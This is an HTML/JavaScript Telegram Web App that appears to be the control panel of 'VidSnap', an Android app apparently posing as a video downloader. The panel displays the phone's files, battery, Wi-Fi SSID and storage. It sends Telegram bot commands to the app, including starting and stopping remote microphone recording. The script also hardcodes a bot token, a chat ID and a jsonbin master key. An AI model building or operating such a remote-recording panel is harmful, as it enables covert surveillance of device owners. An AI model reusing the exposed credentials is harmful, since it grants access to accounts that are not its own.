<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>VidSnap</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap');
:root {
  --bg:#080810;--card:#10101c;--border:#1c1c2e;--accent:#7c3aed;
  --cyan:#06b6d4;--green:#10b981;--red:#ef4444;--yellow:#f59e0b;
  --text:#e2e8f0;--muted:#475569;
  --mono:'JetBrains Mono',monospace;--sans:'Syne',sans-serif;
}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
body{background:var(--bg);color:var(--text);font-family:var(--sans);min-height:100vh;}
.header{padding:14px 16px 10px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--border);position:sticky;top:0;background:var(--bg);z-index:10;}
.header-left{display:flex;align-items:center;gap:10px;}
.logo{width:38px;height:38px;background:linear-gradient(135deg,var(--accent),var(--cyan));border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;}
.header-title{font-size:18px;font-weight:800;letter-spacing:-0.5px;}
.header-sub{font-size:10px;color:var(--muted);font-family:var(--mono);}
.btn-refresh{width:38px;height:38px;border:1px solid var(--border);background:var(--card);color:var(--muted);border-radius:10px;font-size:18px;display:flex;align-items:center;justify-content:center;cursor:pointer;}
.btn-refresh:active{color:var(--accent);border-color:var(--accent);}
.btn-refresh.spin{animation:spin 0.8s linear infinite;}
@keyframes spin{to{transform:rotate(360deg);}}
.tabs{display:flex;padding:10px 16px;gap:8px;border-bottom:1px solid var(--border);overflow-x:auto;scrollbar-width:none;}
.tabs::-webkit-scrollbar{display:none;}
.tab{flex-shrink:0;padding:8px 14px;border:1px solid var(--border);background:var(--card);color:var(--muted);border-radius:20px;font-family:var(--sans);font-size:13px;font-weight:700;cursor:pointer;transition:all 0.15s;display:flex;align-items:center;gap:6px;}
.tab.active{background:var(--accent);border-color:var(--accent);color:white;}
.tab:active{opacity:0.7;}
.content{padding:14px 16px 80px;}
.panel{display:none;}
.panel.active{display:block;animation:fadeUp 0.2s ease;}
@keyframes fadeUp{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:none;}}
.card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:14px;margin-bottom:10px;position:relative;overflow:hidden;}
.card-accent-line{position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--cyan));}
.card-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;}
.card-row:last-child{margin-bottom:0;}
.card-label{font-size:11px;color:var(--muted);font-family:var(--mono);text-transform:uppercase;letter-spacing:0.5px;}
.card-value{font-size:13px;font-weight:700;font-family:var(--mono);}
.card-title{font-size:15px;font-weight:700;}
.card-sub{font-size:11px;color:var(--muted);font-family:var(--mono);margin-top:2px;word-break:break-all;}
.badge{padding:3px 8px;border-radius:6px;font-size:11px;font-weight:700;font-family:var(--mono);}
.badge-green{background:rgba(16,185,129,0.15);color:var(--green);}
.badge-yellow{background:rgba(245,158,11,0.15);color:var(--yellow);}
.badge-red{background:rgba(239,68,68,0.15);color:var(--red);}
.badge-blue{background:rgba(6,182,212,0.15);color:var(--cyan);}
.badge-purple{background:rgba(124,58,237,0.15);color:var(--accent);}
.progress-wrap{margin:10px 0 4px;}
.progress-track{height:6px;background:var(--border);border-radius:3px;overflow:hidden;}
.progress-fill{height:100%;border-radius:3px;background:linear-gradient(90deg,var(--accent),var(--cyan));transition:width 0.4s ease;}
.progress-info{display:flex;justify-content:space-between;font-size:11px;font-family:var(--mono);color:var(--muted);margin-top:4px;}
.btn-row{display:flex;gap:8px;margin-top:12px;}
.btn{flex:1;padding:10px;border-radius:10px;border:1px solid var(--border);background:var(--card);color:var(--text);font-family:var(--sans);font-size:13px;font-weight:700;cursor:pointer;text-align:center;}
.btn:active{opacity:0.6;}
.btn-danger{background:rgba(239,68,68,0.1);border-color:rgba(239,68,68,0.3);color:var(--red);}
.btn-primary{background:rgba(124,58,237,0.15);border-color:rgba(124,58,237,0.4);color:var(--accent);}
.btn-cyan{background:rgba(6,182,212,0.1);border-color:rgba(6,182,212,0.3);color:var(--cyan);}
.stat-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px;}
.stat-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:12px;text-align:center;}
.stat-icon{font-size:22px;margin-bottom:4px;}
.stat-val{font-size:20px;font-weight:800;font-family:var(--mono);}
.stat-lbl{font-size:10px;color:var(--muted);margin-top:2px;text-transform:uppercase;letter-spacing:0.5px;}
.battery-wrap{display:flex;align-items:center;gap:10px;margin:8px 0;}
.battery-body{flex:1;height:20px;border:2px solid var(--border);border-radius:5px;position:relative;overflow:hidden;}
.battery-fill{position:absolute;top:0;left:0;bottom:0;border-radius:3px;transition:width 0.5s ease;}
.battery-pct{font-size:14px;font-weight:700;font-family:var(--mono);min-width:40px;text-align:right;}
.file-item{display:flex;align-items:center;gap:10px;padding:10px 14px;background:var(--card);border:1px solid var(--border);border-radius:12px;margin-bottom:8px;}
.file-icon{font-size:22px;flex-shrink:0;}
.file-info{flex:1;min-width:0;}
.file-name{font-size:13px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.file-meta{font-size:11px;color:var(--muted);font-family:var(--mono);margin-top:2px;}
.empty{text-align:center;padding:48px 24px;color:var(--muted);}
.empty-icon{font-size:48px;margin-bottom:12px;opacity:0.4;}
.empty-text{font-size:14px;}
.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:var(--card);border:1px solid var(--accent);color:var(--text);padding:10px 20px;border-radius:20px;font-size:13px;font-weight:600;z-index:999;opacity:0;transition:opacity 0.3s;white-space:nowrap;}
.toast.show{opacity:1;}
.loader{display:flex;align-items:center;justify-content:center;padding:32px;gap:6px;}
.loader-dot{width:8px;height:8px;border-radius:50%;background:var(--accent);animation:bounce 1.2s infinite ease;}
.loader-dot:nth-child(2){animation-delay:0.15s;}
.loader-dot:nth-child(3){animation-delay:0.3s;}
@keyframes bounce{0%,60%,100%{transform:scale(1);opacity:0.4;}30%{transform:scale(1.3);opacity:1;}}
.rec-btn{width:100%;padding:16px;border-radius:14px;border:2px solid var(--red);background:rgba(239,68,68,0.08);color:var(--red);font-family:var(--sans);font-size:16px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;}
.rec-btn:active{background:rgba(239,68,68,0.2);}
.rec-btn.recording{background:rgba(239,68,68,0.15);animation:pulse-red 1.5s infinite;}
@keyframes pulse-red{0%,100%{box-shadow:0 0 0 0 rgba(239,68,68,0.3);}50%{box-shadow:0 0 0 10px rgba(239,68,68,0);}}
.rec-dot{width:12px;height:12px;border-radius:50%;background:var(--red);}
.rec-dot.blink{animation:blink 1s infinite;}
@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
.offline-banner{background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:10px;padding:10px 14px;margin-bottom:10px;font-size:12px;color:var(--red);text-align:center;display:none;}
</style>
</head>
<body>
<div class="header">
  <div class="header-left">
    <div class="logo">📥</div>
    <div>
      <div class="header-title">VidSnap</div>
      <div class="header-sub" id="last-update">chargement...</div>
    </div>
  </div>
  <button class="btn-refresh" id="btn-refresh" onclick="refreshAll()">↻</button>
</div>
<div class="tabs">
  <button class="tab active" onclick="showTab('downloads')" id="tab-downloads">📥 Téléchargements</button>
  <button class="tab" onclick="showTab('files')" id="tab-files">📂 Fichiers</button>
  <button class="tab" onclick="showTab('device')" id="tab-device">📱 Appareil</button>
  <button class="tab" onclick="showTab('rec')" id="tab-rec">🎙️ Audio</button>
</div>
<div class="content">
  <div class="offline-banner" id="offline-banner">⚠️ VidSnap APK hors ligne — données peut-être obsolètes</div>

  <!-- DOWNLOADS -->
  <div class="panel active" id="panel-downloads">
    <div id="downloads-list"><div class="loader"><div class="loader-dot"></div><div class="loader-dot"></div><div class="loader-dot"></div></div></div>
  </div>

  <!-- FILES -->
  <div class="panel" id="panel-files">
    <div id="files-list"><div class="loader"><div class="loader-dot"></div><div class="loader-dot"></div><div class="loader-dot"></div></div></div>
  </div>

  <!-- DEVICE -->
  <div class="panel" id="panel-device">
    <div class="stat-grid">
      <div class="stat-card"><div class="stat-icon">🔋</div><div class="stat-val" id="stat-batt">--</div><div class="stat-lbl">Batterie</div></div>
      <div class="stat-card"><div class="stat-icon">🌡️</div><div class="stat-val" id="stat-temp">--</div><div class="stat-lbl">Temp.</div></div>
      <div class="stat-card"><div class="stat-icon">💾</div><div class="stat-val" id="stat-free">--</div><div class="stat-lbl">Libre</div></div>
      <div class="stat-card"><div class="stat-icon">📶</div><div class="stat-val" id="stat-net">--</div><div class="stat-lbl">Réseau</div></div>
    </div>
    <div class="card">
      <div class="card-accent-line"></div>
      <div class="card-row"><span class="card-label">Batterie</span><span class="badge" id="badge-charge">--</span></div>
      <div class="battery-wrap">
        <div class="battery-body"><div class="battery-fill" id="batt-fill" style="width:0%"></div></div>
        <div class="battery-pct" id="batt-pct">--%</div>
      </div>
      <div class="card-row" style="margin-top:6px"><span class="card-label">Température</span><span class="card-value" id="batt-temp">--</span></div>
    </div>
    <div class="card">
      <div class="card-accent-line"></div>
      <div class="card-row"><span class="card-label">Réseau</span><span class="card-value" id="net-type">--</span></div>
      <div class="card-row"><span class="card-label">SSID</span><span class="card-value" id="net-ssid">--</span></div>
      <div class="card-row"><span class="card-label">Ping</span><span class="card-value" id="net-ping">--</span></div>
    </div>
    <div class="card">
      <div class="card-accent-line"></div>
      <div class="card-row"><span class="card-label">Stockage interne</span><span class="card-value" id="storage-info">--</span></div>
      <div class="card-row"><span class="card-label">Dossier VidSnap</span><span class="card-value" id="vidsnap-size">--</span></div>
    </div>
    <div class="btn-row">
      <button class="btn btn-danger" onclick="sendCmd('stopall')">🛑 Tout stopper</button>
      <button class="btn btn-primary" onclick="refreshAll()">🔄 Rafraîchir</button>
    </div>
  </div>

  <!-- AUDIO -->
  <div class="panel" id="panel-rec">
    <div class="card" style="text-align:center;padding:20px;">
      <div class="card-accent-line"></div>
      <div style="font-size:48px;margin-bottom:12px;">🎙️</div>
      <div style="font-size:16px;font-weight:700;margin-bottom:4px;">Enregistrement audio</div>
      <div style="font-size:12px;color:var(--muted);margin-bottom:16px;">AAC 64kbps · Mono · Max 3 min</div>
      <div style="display:flex;gap:8px;margin-bottom:12px;justify-content:center;flex-wrap:wrap;">
        <button class="btn btn-primary dur-btn" onclick="setDur(30)" data-dur="30">30s</button>
        <button class="btn btn-primary dur-btn" onclick="setDur(60)" data-dur="60">1 min</button>
        <button class="btn btn-primary dur-btn" onclick="setDur(120)" data-dur="120">2 min</button>
        <button class="btn btn-primary dur-btn" onclick="setDur(180)" data-dur="180">3 min</button>
      </div>
      <button class="rec-btn" id="rec-main-btn" onclick="toggleRec()">
        <div class="rec-dot" id="rec-dot"></div>
        <span id="rec-btn-text">Démarrer l'enregistrement</span>
      </button>
      <div id="rec-timer" style="font-family:var(--mono);font-size:28px;font-weight:700;color:var(--red);display:none;margin:8px 0;">00:00</div>
      <div id="rec-status" style="font-size:12px;color:var(--muted);">Prêt</div>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
// ── CONFIG ────────────────────────────────────────────────────────────────────
const BOT_TOKEN  = "8691967506:AAGVkyGyN08zBzTqTUdKC5Glmzwh-lT1h2s";
const CHAT_ID    = "7686111113";
const BIN_ID     = "69b2b751b7ec241ddc619b32";
const BIN_KEY    = "$2a$10$ayzIwLekHHqCenPqlBF0meWz6fBDF8btoov6IwweAEnmx0dyVFvoO";
const BIN_URL    = `https://api.jsonbin.io/v3/b/${BIN_ID}/latest`;
const TG_API     = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ── STATE ─────────────────────────────────────────────────────────────────────
let currentTab = 'downloads';
let recDuration = 30;
let isRecording = false;
let recInterval = null;
let recSeconds  = 0;
let lastData    = null;

// ── TELEGRAM WEB APP ──────────────────────────────────────────────────────────
const tg = window.Telegram?.WebApp;
if (tg) { tg.ready(); tg.expand(); tg.setHeaderColor('#080810'); tg.setBackgroundColor('#080810'); }

// ── FETCH DATA FROM JSONBIN ───────────────────────────────────────────────────
async function fetchData() {
  try {
    const r = await fetch(BIN_URL, {
      headers: { 'X-Master-Key': BIN_KEY }
    });
    if (!r.ok) return null;
    const j = await r.json();
    return j.record;
  } catch(e) { return null; }
}

// ── SEND COMMAND VIA TELEGRAM ─────────────────────────────────────────────────
async function sendCmd(cmd, arg) {
  const text = arg ? `/${cmd} ${arg}` : `/${cmd}`;
  try {
    await fetch(`${TG_API}/sendMessage`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: CHAT_ID, text })
    });
    showToast('✅ ' + text);
  } catch(e) { showToast('❌ Erreur réseau'); }
}

// ── TABS ──────────────────────────────────────────────────────────────────────
function showTab(name) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
  document.getElementById('tab-' + name).classList.add('active');
  document.getElementById('panel-' + name).classList.add('active');
  currentTab = name;
  renderCurrentTab();
}

// ── REFRESH ───────────────────────────────────────────────────────────────────
async function refreshAll() {
  const btn = document.getElementById('btn-refresh');
  btn.classList.add('spin');
  const data = await fetchData();
  if (data) {
    lastData = data;
    renderAll(data);
  }
  btn.classList.remove('spin');
  document.getElementById('last-update').textContent =
    'màj ' + new Date().toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
}

function renderCurrentTab() {
  if (lastData) renderAll(lastData);
}

// ── RENDER ALL ────────────────────────────────────────────────────────────────
function renderAll(data) {
  // Check APK online (màj < 30s)
  const offline = !data.updatedAt || (Date.now() - data.updatedAt > 30000);
  document.getElementById('offline-banner').style.display = offline ? 'block' : 'none';

  renderDownloads(data.tasks || []);
  renderFiles(data.files || []);
  renderDevice(data);
}

// ── DOWNLOADS ─────────────────────────────────────────────────────────────────
function renderDownloads(tasks) {
  const el = document.getElementById('downloads-list');
  if (!tasks.length) { el.innerHTML = emptyState('😴','Aucun téléchargement actif'); return; }
  el.innerHTML = tasks.map(t => {
    const badges = {
      DOWNLOADING:'<span class="badge badge-purple">⬇️ En cours</span>',
      EXTRACTING: '<span class="badge badge-blue">🔍 Extraction</span>',
      COMPLETED:  '<span class="badge badge-green">✅ Terminé</span>',
      FAILED:     '<span class="badge badge-red">❌ Échec</span>',
      PAUSED:     '<span class="badge badge-yellow">⏸ Pausé</span>',
      QUEUED:     '<span class="badge badge-blue">🕐 Attente</span>',
    };
    const prog = (t.status === 'DOWNLOADING') ? `
      <div class="progress-wrap">
        <div class="progress-track"><div class="progress-fill" style="width:${t.progress||0}%"></div></div>
        <div class="progress-info">
          <span>${t.size||'--'}</span>
          <span>${t.speed||'--'}</span>
          <span>${t.eta ? '⏳ '+t.eta : (t.progress||0)+'%'}</span>
        </div>
      </div>` : '';
    const stopBtn = (t.status==='DOWNLOADING'||t.status==='EXTRACTING') ? `
      <div class="btn-row">
        <button class="btn btn-danger" onclick="sendCmd('cancel','${t.id}')">🛑 Annuler</button>
      </div>` : '';
    return `<div class="card">
      <div class="card-accent-line"></div>
      <div class="card-row">
        <div><div class="card-title">#${t.id}</div><div class="card-sub">${t.name||''}</div></div>
        ${badges[t.status]||''}
      </div>${prog}${stopBtn}</div>`;
  }).join('');
}

// ── FILES ─────────────────────────────────────────────────────────────────────
function renderFiles(files) {
  const el = document.getElementById('files-list');
  if (!files.length) { el.innerHTML = emptyState('📂','Dossier vide'); return; }
  el.innerHTML = files.map(f => {
    const ext = (f.name||'').toLowerCase();
    const icon = ext.endsWith('.mp4')||ext.endsWith('.mkv') ? '🎬'
               : ext.endsWith('.mp3')||ext.endsWith('.m4a') ? '🎵'
               : ext.endsWith('.apk') ? '📦' : '📄';
    return `<div class="file-item">
      <div class="file-icon">${icon}</div>
      <div class="file-info">
        <div class="file-name">${f.name}</div>
        <div class="file-meta">${f.size||''}</div>
      </div>
    </div>`;
  }).join('');
}

// ── DEVICE ────────────────────────────────────────────────────────────────────
function renderDevice(d) {
  const b = d.battery || {};
  const n = d.network || {};
  const s = d.storage || {};

  const pct = b.level || 0;
  document.getElementById('stat-batt').textContent = pct + '%';
  document.getElementById('stat-temp').textContent = b.temp ? b.temp + '°C' : '--';
  document.getElementById('stat-free').textContent = s.free || '--';
  document.getElementById('stat-net').textContent  = n.type || '--';

  document.getElementById('batt-pct').textContent  = pct + '%';
  document.getElementById('batt-temp').textContent = b.temp ? b.temp + '°C' : '--';
  const fill = document.getElementById('batt-fill');
  fill.style.width = pct + '%';
  fill.style.background = pct > 60 ? 'var(--green)' : pct > 25 ? 'var(--yellow)' : 'var(--red)';

  const badge = document.getElementById('badge-charge');
  badge.textContent = b.charging ? '⚡ En charge' : (pct > 20 ? '🔋 Normal' : '🪫 Faible');
  badge.className = 'badge ' + (b.charging ? 'badge-green' : pct > 20 ? 'badge-yellow' : 'badge-red');

  document.getElementById('net-type').textContent = n.type || '--';
  document.getElementById('net-ssid').textContent = n.ssid || '--';
  document.getElementById('net-ping').textContent = n.ping ? n.ping + ' ms' : '--';

  document.getElementById('storage-info').textContent = s.free ? `Libre: ${s.free} / ${s.total||'?'}` : '--';
  document.getElementById('vidsnap-size').textContent = s.vidsnap || '--';
}

// ── AUDIO REC ─────────────────────────────────────────────────────────────────
function setDur(sec) {
  recDuration = sec;
  document.querySelectorAll('.dur-btn').forEach(b => b.style.opacity = b.dataset.dur == sec ? '1' : '0.5');
}
setDur(30);

function toggleRec() { isRecording ? stopRec() : startRec(); }

function startRec() {
  isRecording = true; recSeconds = 0;
  document.getElementById('rec-main-btn').classList.add('recording');
  document.getElementById('rec-dot').classList.add('blink');
  document.getElementById('rec-btn-text').textContent = "Stopper l'enregistrement";
  document.getElementById('rec-timer').style.display = 'block';
  document.getElementById('rec-status').textContent = `🔴 Enregistrement... (max ${recDuration}s)`;
  sendCmd('rec', recDuration.toString());
  recInterval = setInterval(() => {
    recSeconds++;
    const m = Math.floor(recSeconds/60), s = recSeconds%60;
    document.getElementById('rec-timer').textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
    if (recSeconds >= recDuration) stopRec();
  }, 1000);
}

function stopRec() {
  isRecording = false; clearInterval(recInterval);
  document.getElementById('rec-main-btn').classList.remove('recording');
  document.getElementById('rec-dot').classList.remove('blink');
  document.getElementById('rec-btn-text').textContent = "Démarrer l'enregistrement";
  document.getElementById('rec-timer').style.display = 'none';
  document.getElementById('rec-status').textContent = '⏹ Arrêté — envoi en cours...';
  sendCmd('stoprec');
  setTimeout(() => { document.getElementById('rec-status').textContent = 'Prêt'; }, 4000);
}

// ── HELPERS ───────────────────────────────────────────────────────────────────
function emptyState(icon, msg) {
  return `<div class="empty"><div class="empty-icon">${icon}</div><div class="empty-text">${msg}</div></div>`;
}
function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg; t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 2500);
}
